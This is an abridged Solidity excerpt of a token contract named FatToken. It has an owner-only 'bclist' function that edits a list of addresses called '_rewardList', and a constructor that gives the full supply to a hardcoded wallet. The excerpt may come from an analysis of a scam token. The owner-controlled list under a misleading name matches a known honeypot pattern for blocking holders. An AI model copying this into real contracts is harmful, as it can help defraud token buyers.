...
contract BaseFatToken is IERC20, Ownable {
    ...
    function bclist(address addresses, bool value)
        public
        onlyOwner
    {
        require(enableRewardList, "rewardList disabled");
        _rewardList[addresses] = value;
    }
}
...
contract FatToken is BaseFatToken {
    ...
    constructor() { 
        ...
        maxSwapAmount = 1000000000000000 * 10 ** 18; 
        maxWalletAmount = 1000000000000000 * 10 ** 18;
        ...
        address ReceiveAddress = address(0x2b7Ad018aE7c8Cf2479d00566C3f35F7c604d061);

        _balances[ReceiveAddress] = totalSupply;
        emit Transfer(address(0), ReceiveAddress, totalSupply);

        fundAddress = address(0x8f1537331875fef30f6b52588E8CA1Bb083c1995);
